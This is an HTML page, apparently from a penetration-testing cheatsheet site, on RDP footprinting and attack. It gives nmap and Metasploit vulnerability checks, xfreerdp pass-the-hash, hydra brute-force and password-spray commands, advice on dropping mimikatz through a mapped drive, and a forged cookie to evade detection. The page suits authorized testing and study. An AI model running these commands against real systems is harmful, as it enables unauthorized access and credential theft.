@@ -1,0 +1,428 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RDP · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Network › Service Footprinting</nav><h1>RDP</h1><p class="cx-lede">Remote Desktop Protocol footprinting - Network Level Authentication detection, cipher and protocol-version analysis via rdp-sec-check, NLA-required vs NLA-bypass behaviour, credentialed connection with xfreerdp, and recognition of BlueKeep / DejaBlue exposure.</p><div class="cx-tags"><span class="cx-tag">MITRE T1046, T1133, T1021.001, T1078</span><span class="cx-tag">D3FEND D3-NTA, D3-MENCR</span><span class="cx-tag">IMPACT InternalAccess, CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>RDP is the Windows remote-desktop protocol on TCP 3389 (also UDP 3389 in some configurations). The operator-relevant data: whether <strong>Network Level Authentication (NLA)</strong> is required (no NLA = pre-auth screen + screenshots possible), which TLS / CredSSP versions are accepted, whether vulnerable Windows versions are running (BlueKeep, DejaBlue), and whether credentials work for an interactive desktop session.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Service scan
+nmap -sV -sC -p3389 &lt;target&gt;
+
+# 2. RDP-specific security audit
+rdp-sec-check.pl &lt;target&gt;
+
+# 3. NLA detection (also checks BlueKeep when -p3389 added)
+nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 &lt;target&gt;
+
+# 4. Screenshot the pre-auth screen (no NLA)
+nmap -p3389 --script rdp-screenshot &lt;target&gt;
+
+# 5. Credentialed connection
+xfreerdp /v:&lt;target&gt; /u:user /p:&#x27;password&#x27; /size:1280x800 /cert:ignore</code></pre></figure>
+<p>Success indicator: rdp-sec-check reports negotiated protocols and cipher details, NLA status confirmed, BlueKeep status determined, and credentialed <code>xfreerdp</code> produces a desktop.</p>
+<h2 id="protocol-overview">Protocol overview</h2>
+<p>RDP is layered, complex, and Microsoft-proprietary. The protocol stack:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Client                Server
+  |                     |
+  TCP (or TCP + UDP for performance)
+  |                     |
+  X.224 connection request (the very first packet - selects RDP version)
+  |                     |
+  Negotiation: TLS / CredSSP / RDP-encrypted-only
+  |                     |
+  TLS handshake (server cert, optionally client cert)
+  |                     |
+  CredSSP (NLA - if enabled) - verify credentials before resource allocation
+  |                     |
+  RDP MCS conference layer
+  |                     |
+  GCC channels - virtual channels for clipboard, sound, drive redirection, etc.
+  |                     |
+  RDP control PDUs - bitmap updates, input events</code></pre></figure>
+<h3 id="security-tiers">Security tiers</h3>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Authentication</th>
+<th>Encryption</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>RDP standard security</strong></td>
+<td>After connection establishment</td>
+<td>RC4 (broken) or RDP-internal AES</td>
+</tr>
+<tr>
+<td><strong>TLS + RDP</strong></td>
+<td>After TLS, before any credential prompt - server presents cert</td>
+<td>TLS-protected</td>
+</tr>
+<tr>
+<td><strong>NLA / CredSSP</strong></td>
+<td><strong>Before</strong> the server allocates any resources or shows any screen - client must submit credentials in the protocol handshake</td>
+<td>TLS-protected</td>
+</tr>
+</tbody>
+</table>
+<p>NLA is the modern best practice. Without NLA, the server presents a login screen (with the server's name/branding/wallpaper visible) and accepts authentication interactively - which means:</p>
+<ol>
+<li><strong>Pre-auth screenshots</strong> are possible (the <code>rdp-screenshot</code> NSE script automates this)</li>
+<li><strong>DoS via resource exhaustion</strong> is possible (each connection allocates a session before auth)</li>
+<li><strong>Pre-auth vulnerabilities</strong> like BlueKeep affect every connection equally</li>
+</ol>
+<p>With NLA, the server requires the client to prove valid credentials <em>before</em> allocating session resources, eliminating those issues but requiring the operator to have valid credentials before even seeing a prompt.</p>
+<h3 id="important-windows-rdp-versions">Important Windows RDP versions</h3>
+<table>
+<thead>
+<tr>
+<th>Windows Version</th>
+<th>RDP Version</th>
+<th>Key trait</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XP / 2003</td>
+<td>5.1, 5.2</td>
+<td>No NLA at all</td>
+</tr>
+<tr>
+<td>Vista / 2008</td>
+<td>6.0</td>
+<td>NLA introduced, off by default</td>
+</tr>
+<tr>
+<td>7 / 2008 R2</td>
+<td>7.0</td>
+<td>NLA available, often configured</td>
+</tr>
+<tr>
+<td>8 / 2012</td>
+<td>8.0</td>
+<td>NLA can be enforced</td>
+</tr>
+<tr>
+<td>8.1 / 2012 R2</td>
+<td>8.1</td>
+<td>RemoteFX additions</td>
+</tr>
+<tr>
+<td>10 / 2016 / 2019 / 2022</td>
+<td>10.0, 10.1, etc.</td>
+<td>NLA default on</td>
+</tr>
+</tbody>
+</table>
+<p>The famous CVEs:</p>
+<ul>
+<li><strong>CVE-2012-0152 ("MS12-020")</strong> - pre-auth DoS / RCE in older RDP</li>
+<li><strong>CVE-2019-0708 ("BlueKeep")</strong> - pre-auth RCE in XP / 2003 / 7 / 2008 / 2008 R2 RDP - devastating, wormable, <em>patched</em> but unpatched systems still exist</li>
+<li><strong>CVE-2019-1181/1182/1222/1226 ("DejaBlue")</strong> - pre-auth RCE in 7 SP1 / 8.1 / 10 / 2012 / 2012 R2 / 2016 / 2019 RDP - different code path than BlueKeep, similarly devastating</li>
+</ul>
+<p>If you can identify a Windows version vulnerable to either family and confirm exposure, you have an RCE primitive without credentials. <strong>Exploit responsibly - these have a non-trivial chance of crashing the target.</strong></p>
+<h2 id="default-configuration">Default configuration</h2>
+<p>Modern Windows defaults to:</p>
+<ul>
+<li>RDP service disabled (must be enabled by an admin)</li>
+<li>When enabled: NLA required</li>
+<li>TLS 1.2 minimum</li>
+<li>AES-128 minimum cipher</li>
+</ul>
+<p>Older Windows (or admin-customized configs) often deviate.</p>
+<h2 id="dangerous-settings">Dangerous settings</h2>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>What it enables</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RDP enabled and exposed to public internet</td>
+<td>Direct attack surface</td>
+</tr>
+<tr>
+<td><code>UserAuthentication = 0</code> (NLA off)</td>
+<td>Pre-auth screen visible, pre-auth screenshots possible, pre-auth CVEs apply</td>
+</tr>
+<tr>
+<td><code>SecurityLayer = 0</code> ("RDP security layer" - no TLS)</td>
+<td>RC4-based encryption, vulnerable to known attacks</td>
+</tr>
+<tr>
+<td><code>MinEncryptionLevel = 1</code> (Low)</td>
+<td>Encrypts only client-to-server, server-to-client cleartext</td>
+</tr>
+<tr>
+<td>Self-signed cert with no validation enforced</td>
+<td>Trivially MITM-able</td>
+</tr>
+<tr>
+<td>Older Windows versions (7, 2008 R2)</td>
+<td>BlueKeep applies</td>
+</tr>
+<tr>
+<td>Restricted Admin mode disabled</td>
+<td>Once you have admin, credential material on disk is exposed during session</td>
+</tr>
+<tr>
+<td>No account lockout policy</td>
+<td>RDP brute-force feasible (Windows doesn't have fail2ban out-of-the-box)</td>
+</tr>
+<tr>
+<td>RDP exposed <em>with</em> SMB on the same host</td>
+<td>NTLM relay between SMB ↔ RDP becomes a concern in certain configurations</td>
+</tr>
+</tbody>
+</table>
+<h2 id="footprinting-commands">Footprinting commands</h2>
+<h3 id="service-scan">Service scan</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo nmap 10.0.14.128 -sV -sC -p3389</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: WIN-SQL01
+|   NetBIOS_Domain_Name: WIN-SQL01
+|   NetBIOS_Computer_Name: WIN-SQL01
+|   DNS_Domain_Name: WIN-SQL01
+|   DNS_Computer_Name: WIN-SQL01
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-09-16T15:32:42+00:00
+| ssl-cert: Subject: commonName=WIN-SQL01
+| Issuer: commonName=WIN-SQL01
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-09-15T18:43:18
+|_Not valid after:  2022-03-17T18:43:18</code></pre></figure>
+<p>The <code>rdp-ntlm-info</code> NSE script triggers an NTLM challenge pre-auth and reads the response - leaking:</p>
+<ul>
+<li>Computer name (<code>WIN-SQL01</code>)</li>
+<li>Domain (none here - standalone; or <code>DOMAIN.LOCAL</code> for joined hosts)</li>
+<li>Windows version (<code>10.0.17763</code> = Server 2019)</li>
+<li>System time (clock-skew check for Kerberos)</li>
+</ul>
+<p>The TLS cert subject (<code>commonName=WIN-SQL01</code>) reveals the hostname even when DNS resolution doesn't.</p>
+<h3 id="rdp-sec-checkpl">rdp-sec-check.pl</h3>
+<p>Dedicated audit tool for RDP security configuration:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rdp-sec-check.pl 10.0.14.128</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Starting rdp-sec-check v0.9-beta against 10.0.14.128:3389
+
+Summary of protocols and ciphers supported:
+[+] Negotiated security layer
+    SSL/TLS supported:          TRUE
+    CredSSP (NLA) supported:    TRUE
+    CredSSP with Early User Authentication:  FALSE
+    RDP Standard Security supported:  FALSE
+    RDP Encryption Required: AES-128 only
+
+[+] Cipher suites accepted via SSL/TLS:
+    TLS_RSA_WITH_AES_256_CBC_SHA
+    TLS_RSA_WITH_AES_128_CBC_SHA
+    TLS_RSA_WITH_3DES_EDE_CBC_SHA   &lt;-- weak (3DES)
+
+[+] Issues
+    [-] 3DES cipher suites accepted (Sweet32 - CVE-2016-2183)</code></pre></figure>
+<p>What this tells you:
+- NLA is supported (CredSSP TRUE)
+- Standard RDP security (the broken RC4 path) is disabled
+- 3DES is still accepted (Sweet32 - minor compliance finding, not directly exploitable)</p>
+<p>If <code>CredSSP (NLA) supported: FALSE</code> is reported, the operator-relevant impact is:
+- Pre-auth screen visible (rdp-screenshot becomes useful)
+- Pre-auth CVEs may apply
+- DoS via connection exhaustion is feasible</p>
+<h3 id="nla-specific-scripts">NLA-specific scripts</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># NLA enforcement check
+nmap -p3389 --script rdp-enum-encryption 10.0.14.128
+
+# Screenshot the pre-auth banner (only works if NLA is disabled)
+nmap -p3389 --script rdp-screenshot 10.0.14.128
+
+# Older Microsoft RDP-CVE checks
+nmap -p3389 --script &quot;rdp-vuln-ms12-020&quot; 10.0.14.128</code></pre></figure>
+<h3 id="bluekeep-dejablue-detection">BlueKeep / DejaBlue detection</h3>
+<p>The Metasploit modules:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">msf &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+msf &gt; set RHOSTS 10.0.14.128
+msf &gt; run
+
+# Or DejaBlue specifically
+msf &gt; use auxiliary/scanner/rdp/cve_2019_1181_1182_chksum
+msf &gt; set RHOSTS 10.0.14.128
+msf &gt; run</code></pre></figure>
+<p>These check for the vulnerable code path without actually triggering the bug. If a check comes back positive, the exploit is in <code>exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> (BlueKeep) - <strong>with caveats</strong>: the exploit is known to BSOD targets in roughly 40% of attempts in real-world conditions. Test only with explicit authorization to risk a crash.</p>
+<h3 id="credentialed-connection-xfreerdp">Credentialed connection - xfreerdp</h3>
+<p><code>xfreerdp</code> is the operator-preferred RDP client on Linux:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">xfreerdp /v:10.0.14.128 /u:Administrator /p:&#x27;P4ssw0rd!&#x27; \
+         /size:1280x800 /cert:ignore +clipboard /drive:share,/tmp</code></pre></figure>
+<p>Useful options:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/v:&lt;host&gt;</code></td>
+<td>Target</td>
+</tr>
+<tr>
+<td><code>/u:&lt;user&gt;</code></td>
+<td>Username (<code>DOMAIN\user</code> or just <code>user</code> for local)</td>
+</tr>
+<tr>
+<td><code>/p:'&lt;pass&gt;'</code></td>
+<td>Password (single-quote it to escape special characters)</td>
+</tr>
+<tr>
+<td><code>/pth:&lt;hash&gt;</code></td>
+<td>Pass-the-hash (NTLM hash instead of password)</td>
+</tr>
+<tr>
+<td><code>/d:&lt;domain&gt;</code></td>
+<td>Domain</td>
+</tr>
+<tr>
+<td><code>/size:WIDTHxHEIGHT</code></td>
+<td>Window size - useful for headless boxes</td>
+</tr>
+<tr>
+<td><code>/cert:ignore</code></td>
+<td>Don't bother validating the cert (most engagements need this)</td>
+</tr>
+<tr>
+<td><code>+clipboard</code></td>
+<td>Bidirectional clipboard sync</td>
+</tr>
+<tr>
+<td><code>/drive:name,/local/path</code></td>
+<td>Map a local directory as a drive on the remote</td>
+</tr>
+<tr>
+<td><code>/sound</code></td>
+<td>Forward audio</td>
+</tr>
+<tr>
+<td><code>/network:auto</code></td>
+<td>Auto-detect connection quality</td>
+</tr>
+<tr>
+<td><code>+toggle-fullscreen</code></td>
+<td>Allow Ctrl+Alt+Enter fullscreen toggle</td>
+</tr>
+<tr>
+<td><code>/dynamic-resolution</code></td>
+<td>Auto-resize on window resize</td>
+</tr>
+</tbody>
+</table>
+<p>A typical operator session with file transfer enabled:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">xfreerdp /v:10.0.14.128 /u:&#x27;EXAMPLE\admin&#x27; /p:&#x27;p4ss&#x27; \
+         /size:1920x1080 /cert:ignore +clipboard \
+         /drive:tools,/home/operator/windows-tools</code></pre></figure>
+<p>Now your <code>windows-tools</code> directory appears as a drive on the remote - drop <code>mimikatz.exe</code>, <code>rubeus.exe</code>, etc. through it without going over the network as a separate transfer.</p>
+<h3 id="pass-the-hash-with-xfreerdp">Pass-the-hash with xfreerdp</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">xfreerdp /v:10.0.14.128 /u:Administrator \
+         /pth:31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 \
+         /cert:ignore</code></pre></figure>
+<p>Two hashes separated by <code>:</code> are LM:NTLM. For modern Windows the LM hash is blank - substitute <code>aad3b435b51404eeaad3b435b51404ee</code> (the well-known empty-LM hash).</p>
+<p>For pass-the-hash to work over RDP, the target's <code>Restricted Admin</code> mode must be enabled (registry key <code>HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0</code>). Older Windows (pre-8.1) had this enabled by default; modern Windows defaults to disabled.</p>
+<h3 id="rdesktop">rdesktop</h3>
+<p>The older alternative client. Sometimes works better with very-old Windows RDP versions:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rdesktop -u Administrator -p &#x27;P4ssw0rd!&#x27; 10.0.14.128</code></pre></figure>
+<h3 id="brute-force">Brute-force</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt rdp://10.0.14.128
+crowbar -b rdp -s 10.0.14.128/32 -u Administrator -C passwords.txt
+
+# Spray (one password across many usernames)
+hydra -L users.txt -p &#x27;Spring2024!&#x27; rdp://10.0.14.128</code></pre></figure>
+<p>Windows RDP has no rate-limiting by default. Bigger concern: Active Directory account-lockout policy. Spraying with one password per user per day is the standard safe pattern in red-team work; testing with permission allows faster cycles.</p>
+<h3 id="rdp-cookie-sniffing">RDP cookie sniffing</h3>
+<p>Quick fingerprint: the initial X.224 Connection Request packet includes the client's "Cookie" - Microsoft's RDP client uses <code>mstshash=&lt;username&gt;</code> where <code>&lt;username&gt;</code> is whatever the user typed last. Nmap's RDP scan inadvertently leaves <code>mstshash=nmap</code> in target logs:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Cookie: mstshash=nmap</code></pre></figure>
+<p>This is a useful indicator of compromise for defenders (any RDP session log containing <code>nmap</code> is suspicious) and a heads-up for operators (set a believable cookie value when avoiding detection):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">xfreerdp /v:&lt;target&gt; /u:user /p:pass /from-stdin:0 /cookie:mstshash=Administrator</code></pre></figure>
+<h2 id="common-chained-workflows">Common chained workflows</h2>
+<p><strong>SMB password → RDP access:</strong>
+1. Find credentials via SMB enumeration (see <a href="../smb/index.html">SMB</a>)
+2. <code>xfreerdp /v:target /u:user /p:'password' /cert:ignore</code>
+3. Interactive desktop session opens
+4. From there, dump local creds with mimikatz, hunt for stored passwords, escalate</p>
+<p><strong>Domain admin hash → RDP via PTH:</strong>
+1. Mimikatz/secretsdump produces NTLM hashes from a previously-compromised host
+2. <code>xfreerdp /v:dc01 /u:Administrator /pth:&lt;hash&gt;</code>
+3. RDP into the domain controller</p>
+<p><strong>No NLA → pre-auth screenshot → user/version intel:</strong>
+1. <code>nmap --script rdp-screenshot</code> produces a PNG
+2. The screenshot may reveal: domain name in the login banner, configured wallpaper (sometimes contains internal app references), Windows version
+3. Combine with <code>rdp-ntlm-info</code> for full intel</p>
+<p><strong>Open RDP on internet → BlueKeep check:</strong>
+1. <code>auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code>
+2. If vulnerable, document for the report
+3. Exploit only with explicit authorization</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service scan</td>
+<td><code>nmap -sV -sC -p3389 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>NTLM intel</td>
+<td><code>nmap -p3389 --script rdp-ntlm-info &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Encryption audit</td>
+<td><code>rdp-sec-check.pl &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Pre-auth screenshot</td>
+<td><code>nmap -p3389 --script rdp-screenshot &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>MS12-020 check</td>
+<td><code>nmap -p3389 --script rdp-vuln-ms12-020 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>BlueKeep check</td>
+<td><code>msf &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></td>
+</tr>
+<tr>
+<td>Connect (xfreerdp)</td>
+<td><code>xfreerdp /v:&lt;target&gt; /u:&lt;user&gt; /p:'&lt;pass&gt;' /cert:ignore</code></td>
+</tr>
+<tr>
+<td>Pass-the-hash</td>
+<td><code>xfreerdp /v:&lt;target&gt; /u:Administrator /pth:&lt;NT-hash&gt; /cert:ignore</code></td>
+</tr>
+<tr>
+<td>Connect (rdesktop)</td>
+<td><code>rdesktop -u &lt;user&gt; -p '&lt;pass&gt;' &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Map local drive</td>
+<td><code>xfreerdp ... /drive:share,/local/path</code></td>
+</tr>
+<tr>
+<td>Brute-force</td>
+<td><code>hydra -L users -P pass rdp://&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Single-password spray</td>
+<td><code>hydra -L users -p 'Spring2024!' rdp://&lt;target&gt;</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../r-services/index.html">Previous: R-services</a><a class="cx-next" href="../winrm/index.html">Next: WinRM</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
